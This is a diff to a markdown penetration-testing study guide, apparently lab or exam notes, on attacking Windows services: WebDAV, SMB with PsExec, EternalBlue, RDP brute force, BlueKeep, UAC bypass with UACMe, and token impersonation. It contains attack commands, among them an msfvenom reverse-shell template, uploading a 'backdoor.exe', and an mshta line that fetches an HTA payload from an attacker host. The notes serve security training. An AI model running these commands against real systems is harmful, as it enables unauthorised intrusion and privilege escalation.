@@ -79,7 +79,7 @@ The `-sC` options is helpful since it can tell if WebDAV is enabled using script
 nmap -sV -p80 --script=http-enum <target>
 ```
 
-The http-enum script should return some helpful information like <u>the directory webdav might be enabled on</u>. If you get a response like `401 Unauthorized` then authentication has been enabled on the WebDav server. You can manually check that location in the browser.
+The http-enum script should return some helpful information like **the directory webdav might be enabled on**. If you get a response like `401 Unauthorized` then authentication has been enabled on the WebDav server. You can manually check that location in the browser.
 
 ```
 http://target/listed_webdav_directory/
@@ -139,7 +139,7 @@ The  results for DavTest will have the following checks show in the output
 3. **Sending test files** | Tries uploading test files like txt,jsp,aspx etc)   
 - `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz/davtest_E93ge9fF39Giz.aspx` 
 4. **Checking for test file execution:** Tests the execution of each type of file that was uploaded. Important to see which types of files can be executed on the server.
-	- <u>Asp would be good for generating an asp payload or uploading an asp webshell which can be accomplished by cadaver.</u>
+	- **Asp would be good for generating an asp payload or uploading an asp webshell which can be accomplished by cadaver.**
 
 ### Cadaver
 
@@ -316,25 +316,30 @@ The SMB protocol uses two levels of authentication:
 - **Share Authentication**: Users provide a password to access specific, restricted shares.
 
 Both methods rely on the NTLM (NT LAN Manager) challenge-response protocol to securely authenticate without sending the password over the network:
-1. <u>Client Sends Username</u>: The client sends its username to the server.
+1. Client Sends Username**: The client sends its username to the server.
 	- *Client sends `"user1"` to the server.*
-2. <u>Server Sends a Challenge</u>: The server responds with a unique, random challenge back to the client.
+2. **Server Sends a Challenge**: The server responds with a unique, random challenge back to the client.
 	- *Server sends `XYZ789` to the client.*
-3. <u>Client Hashes the Password</u>: The client hashes the user’s password using the NTLM algorithm.
+3. **Client Hashes the Password**: The client hashes the user’s password using the NTLM algorithm.
 	- *Password `MyPassword123` is hashed to `8F29A0B676...`.*
-4. <u>Client Encrypts the Challenge</u>: The client uses the NTLM-hashed password as a key to encrypt the server’s challenge. This is symmetric encryption, where the same secret (hashed password) is shared between client and server.
+4. **Client Encrypts the Challenge**: The client uses the NTLM-hashed password as a key to encrypt the server’s challenge. This is symmetric encryption, where the same secret (hashed password) is shared between client and server.
 	- *The client encrypts `XYZ789` with the hash `8F29A0B676...` , producing `D4E8F6A2...`.*
-5. <u>Client Sends Encrypted Response</u>: The client sends the challenge encrypted using the NTLM hashed password  challenge back.
+5. **Client Sends Encrypted Response**: The client sends the challenge encrypted using the NTLM hashed password  challenge back.
 	- *Client sends `D4E8F6A2...` to the server.*
-6. <u>Server Verifies the Response</u>: The server encrypts the challenge it sent using the NTLM hash of the password for the account as a key, just like the client did. It then compares the result to the client’s response. If they match, authentication succeeds.
+6. **Server Verifies the Response**: The server encrypts the challenge it sent using the NTLM hash of the password for the account as a key, just like the client did. It then compares the result to the client’s response. If they match, authentication succeeds.
 	- *The server encrypts `XYZ789` using the stored hash. If the result matches `D4E8F6A2...`, authentication succeeds.*
 
 ##### PsExec 
 
-PsExec is a command-line utility from Microsoft's Sysinternals suite that enables administrators to execute commands/processes on remote Windows systems. It was developed to be a telnet replacement. PxExec operates over SMB for authentication, using the provided credentials to run the processes remotely. PsExec provides on command-line interactions unlike Remote Desktop Protocol (RDP), which provides a GUI to a target system. PsExec doesn't need to be installed. It operates by copying its executable (`psexesvc.exe`) to the target machine's administrative share ( `ADMIN$`), where it installs and runs a service to execute the specified commands. After execution, PsExec removes the service and the executable from the target system.
+PsExec is a command-line utility from Microsoft's Sysinternals suite that enables administrators to execute commands/processes on remote Windows systems. It was developed to be a telnet replacement. PxExec operates over SMB for authentication, using the provided credentials to run the processes remotely. PsExec provides on command-line interactions unlike Remote Desktop Protocol (RDP), which provides a GUI to a target system. 
+
+PsExec doesn't need to be installed. It operates by copying its executable (`psexesvc.exe`) to the target machine's administrative share ( `ADMIN$`), where it installs and runs a service to execute the specified commands. After execution, PsExec removes the service and the executable from the target system.
 
 - Link to PsTools Package Download: https://download.sysinternals.com/files/PSTools.zip
 
+```
+C:\<location>\PsExec.exe \\10.63.45.88 -u Administrator -p Password powershell.exe
+```
 ##### SMB Exploitation with PsExec
 
 To exploit SMB using PsExec, aim to obtain legitimate credentials, such as a username/password or password hash. This can be achieved through techniques like SMB login brute-force attacks, focusing on common Windows user accounts (e.g., **Administrator**).
@@ -434,9 +439,9 @@ If the system is vulnerable, we can execute the exploit.
 #### Option A.) Manual Exploitation of Eternal Blue
 
 ###### Manual Exploitation Process: 
-1. <u>Generate Shellcode/Payload</u>: To exploit EternalBlue using AutoBlue, we first need to generate shellcode payload, that gives us a reverse shell after the SMB vulnerability has been exploited.
-2. <u>Setup listener</u>: Once that's generated, we'll need to setup our netcat listener
-3. <u>Run the python exploit</u>: Run the python exploit script (`eternalblue_exploit*.py`) specify the target IP and the shell code we would like to exploit then we should get a reverse shell on the netcat listener
+1. **Generate Shellcode/Payload**: To exploit EternalBlue using AutoBlue, we first need to generate shellcode payload, that gives us a reverse shell after the SMB vulnerability has been exploited.
+2. **Setup listener**: Once that's generated, we'll need to setup our netcat listener
+3. **Run the python exploit**: Run the python exploit script (`eternalblue_exploit*.py`) specify the target IP and the shell code we would like to exploit then we should get a reverse shell on the netcat listener
 
 **Autoblue** is an automated script used to exploit the EternalBlue vulnerability (CVE-2017-0144), without the need for Metasploit.   You can clone the AutoBlue repository (https://github.com/3ndG4me/AutoBlue-MS17-010): 
 ```
@@ -555,7 +560,7 @@ After configuring changes, run the exploit using `exploit`. The exploit is done 
 
 ### RDP
 
-The Remote Desktop Protocol (RDP), developed by Microsoft, is used to remotely connect and interact with Windows systems. By default, it operates on TCP port 3389, though it can be configured to use other ports. Its common common that RDP could be running on a different port. RDP authentication requires a valid user account and the associated password in clear text. <u>We can exploit RDP by performing brute-force attacks to identify valid user credentials  and gain remote access to the target</u>. 
+The Remote Desktop Protocol (RDP), developed by Microsoft, is used to remotely connect and interact with Windows systems. By default, it operates on TCP port 3389, though it can be configured to use other ports. Its common common that RDP could be running on a different port. RDP authentication requires a valid user account and the associated password in clear text. **We can exploit RDP by performing brute-force attacks to identify valid user credentials  and gain remote access to the target**. 
 
 1. **Perform an initial Nmap scan against the target**: Make sure to scan the entire TCP port range `-p-` since RDP could be configured on a different port. Can also ran this as a SYN Scan `-sS` to make this more stealthier.
 ```
@@ -626,7 +631,7 @@ This will return the RDP GUI windows for the target.
 
 ## BlueKeep
 
-BlueKeep (CVE-2019-0708) is a inherent remote code execution vulnerability in the Windows RDP protocol, publicly disclosed by Microsoft in 2019. Instead of brute forcing for valid user accounts, the vulnerability exploits a flaw in the RDP protocol itself by <u>gaining access to a chunk of kernel memory</u> and remotely executing arbitrary code at the system level without authentication. Attackers specifically target the kernel because it operates in a highly privileged space, so any code ran there will inherit elevated privileges. For instance, executing a meterpreter payload in the kernel would grant a session with elevated access. However, executing code at the kernel level also carries the risk of causing system instability or crashes. Microsoft released a patch for this vulnerability on May 14th, 2019. The BlueKeep vulnerability affects multiple versions of Windows XP/Vista/7 and Windows Server 2008 & R2.
+BlueKeep (CVE-2019-0708) is a inherent remote code execution vulnerability in the Windows RDP protocol, publicly disclosed by Microsoft in 2019. Instead of brute forcing for valid user accounts, the vulnerability exploits a flaw in the RDP protocol itself by **gaining access to a chunk of kernel memory** and remotely executing arbitrary code at the system level without authentication. Attackers specifically target the kernel because it operates in a highly privileged space, so any code ran there will inherit elevated privileges. For instance, executing a meterpreter payload in the kernel would grant a session with elevated access. However, executing code at the kernel level also carries the risk of causing system instability or crashes. Microsoft released a patch for this vulnerability on May 14th, 2019. The BlueKeep vulnerability affects multiple versions of Windows XP/Vista/7 and Windows Server 2008 & R2.
 
 The exploit will fail unless the following prerequisites are met:
 1. RDP needs to be enabled
@@ -849,7 +854,7 @@ This will enumerate the vulnerabilities and display any local metasploit modules
 **Note: Make sure to research the found exploits to confirm what the exploit does and if its applicable to the version of the operating system.**
 #### Manual Privilege Escalation
 
-**Windows-Exploit-Suggester** - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. <u>This repo has been archived and hasn't been actively maintained since July 2023</u>.
+**Windows-Exploit-Suggester** - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. **This repo has been archived and hasn't been actively maintained since July 2023**.
 
 + GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 
@@ -883,7 +888,7 @@ Expand-Archive -Path .\original.zip -DestinationPath .\destination-folder
 User Account Control (UAC) is a Windows security feature that prevents unauthorized changes to the operating system by requiring administrator approval for elevated actions. Non-privileged users will be prompted to provide administrative credentials to perform the action, while privileged users willl be prompted with a Yes/No consent before continuing. Attacks can attempt to bypass UAC to execute malicious software with elevated privileges.
 ##### Bypassing UAC
 
-<u>To bypass UAC, access to a user account within the local administrators group of the target system is required</u>. UAC prompts users to confirm or provide credentials before granting administrative privileges.
+**To bypass UAC, access to a user account within the local administrators group of the target system is required**. UAC prompts users to confirm or provide credentials before granting administrative privileges.
 
 UAC has integrity levels ranging from low to high, if the UAC protection level is set below "high," some programs can run with elevated privileges without prompting the user. So, for example, if we create a meterpreter payload with msfvenom and have it successfully uploaded/executed on the target with administrative privileges, we would then bypass UAC without the need for the consent prompt.
 
@@ -915,7 +920,7 @@ To make UCAMe work to bypass UAC we'll need the following:
 4. Run the payload with Akagi to bypass UAC and get elevated meterpreter session
 
 ---
-1. <u>Gain Initial Access on the target</u>: Run an initial Nmap scan and try to exploit any service. We'll use the meterpreter session to view the initial privileges and upload the payload/akagi executables to the target.
+1. **Gain Initial Access on the target**: Run an initial Nmap scan and try to exploit any service. We'll use the meterpreter session to view the initial privileges and upload the payload/akagi executables to the target.
 
 **Useful Meterpreter Commands/Tips:**
 - Get current user => `getuid`
@@ -934,7 +939,7 @@ meterpreter> migrate 2342
 In the shell session, you'll receive an "`System error 5 has occured. Access is denied` " since we'd need to respond to the UAC consent prompt which can't be done through the shell unless you bypass UAC.
 
 ---
-2. <u>Create the metepreter payload with msfvenom and start a listener with multi handler</u>: We're creating the msfvenom payload because the initial Meterpreter session may lack high privileges or is unstable. Running the payload with UACMe will elevate the meterpreter session's privileges, ensuring the new payload establishes a fully privileged and hopefully more stable session. 
+2. **Create the metepreter payload with msfvenom and start a listener with multi handler**: We're creating the msfvenom payload because the initial Meterpreter session may lack high privileges or is unstable. Running the payload with UACMe will elevate the meterpreter session's privileges, ensuring the new payload establishes a fully privileged and hopefully more stable session. 
 ```
 msfvenom -p payload LHOST=atk_machine LPORT=l_port -f file_type > file_name
 ```
@@ -962,7 +967,7 @@ msf6> run
 ```
 
 ---
-3. <u>Upload the executables to the target</u>: Use the initial meterpreter/shell session to upload the reverse shell payload and akagi executable. It's recommended to have a Temp directory on the root of the C: drive to upload the payload to, so navigate/create the directory on the target.
+3. **Upload the executables to the target**: Use the initial meterpreter/shell session to upload the reverse shell payload and akagi executable. It's recommended to have a Temp directory on the root of the C: drive to upload the payload to, so navigate/create the directory on the target.
 
 ```
 meterpreter> cd C:\\
@@ -980,7 +985,7 @@ meterpreter> upload backdoor.exe
 meterpreter> upload UACME/Akagi64.exe
 ```
 
-4. <u>Run Akagi with the payload </u>: If you try to just run the payload backdoor now, UAC will prevent the execution. We'll run akagi with the payload. UACMe uses an akagi32/akagi64 executable which you need to specify a `Key` which is the number of method to use and then a `Parameter` which is the path to the payload executable you want to execute.  Look into the 'Keys' section listed in the description of the Github repository. Method 23 is recommended on windows 10 systems but doublecheck to see which Keys were fixed/patched. The execution of the executable should bypass UAC. Try to locate methods that work for the target operating system and hasn't been listed as fixed.
+4. **Run Akagi with the payload **: If you try to just run the payload backdoor now, UAC will prevent the execution. We'll run akagi with the payload. UACMe uses an akagi32/akagi64 executable which you need to specify a `Key` which is the number of method to use and then a `Parameter` which is the path to the payload executable you want to execute.  Look into the 'Keys' section listed in the description of the Github repository. Method 23 is recommended on windows 10 systems but doublecheck to see which Keys were fixed/patched. The execution of the executable should bypass UAC. Try to locate methods that work for the target operating system and hasn't been listed as fixed.
 ```
 akagi_exe [method_num] payload_location
 ```
@@ -1032,24 +1037,24 @@ The ability to impersonate access tokens for privilege escalation depends on the
 
 The Incognito module, originally a standalone application, is now integrated into Meterpreter. It allows impersonation of user tokens after successful exploitation. This module can also display a list of tokens available for impersonation.
 
-1. <u>Initial Access:</u> Perform an nmap scan on the system and then try to exploit any services on an open port to get a meterpreter session.
+1. **Initial Access:** Perform an nmap scan on the system and then try to exploit any services on an open port to get a meterpreter session.
 
-2. <u>Check Privileges</u>: Can confirm the current user with `getuid` and then check their privileges with `getprivs`. Make sure it has at least of one the three privileges:
+2. **Check Privileges**: Can confirm the current user with `getuid` and then check their privileges with `getprivs`. Make sure it has at least of one the three privileges:
 	- **SeAssignPrimaryToken**
 	- **SeCreateToken**
 	- **SeImpersonatePrivilege**
 
-3. <u>Load Incognito</u>: Load the incognito extension from the meterpreter session.
+3. **Load Incognito**: Load the incognito extension from the meterpreter session.
 ```
 load incognito
 ```
 
-4. <u>View Access Tokens</u>: Run `list_tokens` to view the available access tokens. Note any potential admin accounts
+4. **View Access Tokens**: Run `list_tokens` to view the available access tokens. Note any potential admin accounts
 ```
 list_tokens -u
 ```
 
-5. <u>Impersonate a Token</u>: Use `impersonate_token` for the actual impersonation, copy/paste the admin user within quotes.
+5. **Impersonate a Token**: Use `impersonate_token` for the actual impersonation, copy/paste the admin user within quotes.
 ```
 impersonate_token "ATTACKDEFENSE\Administrator"
 ```
@@ -1161,7 +1166,7 @@ Exploitation Steps:
 1. First gain initial access into the system with a meterpreter session
 2. Next, use the meterpreter session to find the unattended xml file
 3. Identify the password and decode it with a base64 utility.
-4. Authenticate with the target with PsExec
+4. Authenticate with the target with a tool like PsExec
 
 ##### Generate a meterpreter payload using MSFVenom
 
@@ -1240,28 +1245,32 @@ Example: You can run psexec.py against the target and try to execute a shell usi
 psexec.py Administrator@10.63.45.88 cmd.exe
 ```
 
-
 ### PowerSploit to find Unattended Installation files
 
-**PowerSploit** is a collection of Microsoft PowerShell modules designed to assist penetration testers during all phases of an assessment. One of these modules, **PowerUp.ps1**, focuses on identifying common Windows privilege escalation vectors that exploit misconfigurations. We will run the PowerUp.ps1 script to detect potential privilege escalation vulnerabilities on the system.
-- **Github**: https://github.com/PowerShellMafia/PowerSploit
+**PowerSploit** is a collection of Microsoft PowerShell modules designed to assist penetration testers during all phases of an assessment. One of these modules, **PowerUp.ps1**, focuses on identifying common Windows privilege escalation vectors that exploit misconfigurations. We will run the PowerUp.ps1 script to detect potential privilege escalation vulnerabilities on the system. This repository has been archived by the owner on Jan 20, 2021
+- **Github**: https://github.com/PowerShellMafia/PowerSploit (This repository has been archived by the owner on Jan 20, 2021)
 
-1. Navigate to the PowerUp Script:
+1. **Download the project**: You can clone the github project, the PowerUp Script will be in the 'Privesc' directory inside the project.
 ```
+git clone https://github.com/PowerShellMafia/PowerSploit.git
+
 ..\PowerSploit\Privesc\
 ```
 
-2. <u>Starts a new PowerShell session with the execution policy set to "bypass"</u>: Normally, PowerShell enforces an execution policy to prevent untrusted scripts from running (like "Restricted" or "RemoteSigned"). Setting the execution policy `-ep`  to bypass tells PowerShell to ignore those restrictions just for this session, allowing any script to run freely.
+2. **Starts a new PowerShell session with the execution policy set to "bypass"**: Normally, PowerShell enforces an execution policy to prevent untrusted scripts from running (like "Restricted" or "RemoteSigned"). 
+	- **Restricted**: This is the most restrictive policy. It prevents all scripts from running, allowing only interactive commands in the PowerShell console. This ensures no scripts, even signed ones, can be executed.
+	- **RemoteSigned**: This policy allows locally created scripts to run without restriction but requires that scripts downloaded from the internet (or other untrusted sources) have a valid digital signature from a trusted publisher. 
+	Setting the execution policy (`-ep`)  to bypass which tells PowerShell to ignore those restrictions for this session, allowing any script to run freely.
 ```
 powershell -ep bypass
 ```
 
-3. <u>Import the PowerSploit PowerUp script</u>: Importing the PowerSploit script makes its functions and variables available for use. The dot-sourcing operator **(`.`)** makes sure the script runs in the **current session**, not a new one, allowing its contents to stay in memory and be directly accessible whenever needed throughout the session. Without dot-sourcing, the script would run in isolation, meaning functions like `Invoke-PrivescAudit` wouldn’t be available once the script finishes.
+3. **Import the PowerSploit PowerUp script**: Importing the PowerSploit script makes its functions and variables available for use. The dot-sourcing operator **(`.`)** makes sure the script runs in the **current session**, not a new one, allowing its contents to stay in memory and be directly accessible whenever needed throughout the session. Without dot-sourcing, functions like `Invoke-PrivescAudit` wouldn’t be available once the script finishes.
 ```
 . .\PowerUp.ps1
 ```
 
-4. <u>Run the PrivescAudit function</u>:  The `Invoke-PrivescAudit` function defined within the PowerUp.ps1 script that runs the privilege escalation audit, scanning for misconfigurations like vulnerable services or weak file permissions. Since the script was dot-sourced, this function is now available in the current PowerShell session.
+4. **Run the PrivescAudit function**:  The `Invoke-PrivescAudit` function defined within the PowerUp.ps1 script that runs the privilege escalation audit, scanning for misconfigurations like vulnerable services or weak file permissions. Since the script was dot-sourced, this function is now available in the current PowerShell session.
 ```
 Invoke-PrivescAudit
 ```
@@ -1289,9 +1298,9 @@ ssword))
 
 1. `[System.Convert]::FromBase64String(<base64_password>)`: The base64 string is a textual representation of binary data. To retrieve the original password, we first need to decode it into its binary form.  The `System.Convert` .NET class provides methods for data type conversions, and here we use its `FromBase64String` method to convert the base64 string into a byte array, which represents the raw binary data. Since the byte array is not really human-readable, it must be further processed.
 
-2. `[System.Text.Encoding]::UTF8.GetString(<binary_btye_array>)`: To convert the binary data into a readable format, we use the `System.Text.Encoding` .NET class, which handles character encoding and decoding. Specifically, the `UTF8.GetString` method translates the byte array into a UTF-8 encoded string. UTF-8 is a widely used character encoding standard in PowerShell, ensuring that the decoded string is properly interpreted as human-readable text. 
+2. `[System.Text.Encoding]::UTF8.GetString(<binary_btye_array>)`: To convert the binary data into a readable format, we use the `System.Text.Encoding` .NET class, which handles character encoding and decoding. Specifically, the `UTF8.GetString` method translates the byte array into a UTF-8 encoded string. UTF-8 is a widely used character encoding standard in PowerShell which ensures the decoded string is properly interpreted as human-readable. 
 
-We can ran a command prompt as an administrator user using discover credentials.
+	We can run a command prompt as an administrator user using the `discovered credentials.
 
 ```
 runas.exe /user:administrator cmd
@@ -1320,7 +1329,6 @@ mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
 Since the command prompt was launched with administrator privileges, any subsequent process like the  `mshta.exe` process running the hta payload will inherit the same elevated privileges. So the resulting Meterpreter session will have administrator-level access. 
 
 **Helpful Meterpreter Windows OS Tips**
-
 - Get to root directory -> `cd /
 - Navigate to a directory -> `C:\\Users\\Administrator\\Desktop`
 - List contents of a directory -> `dir`
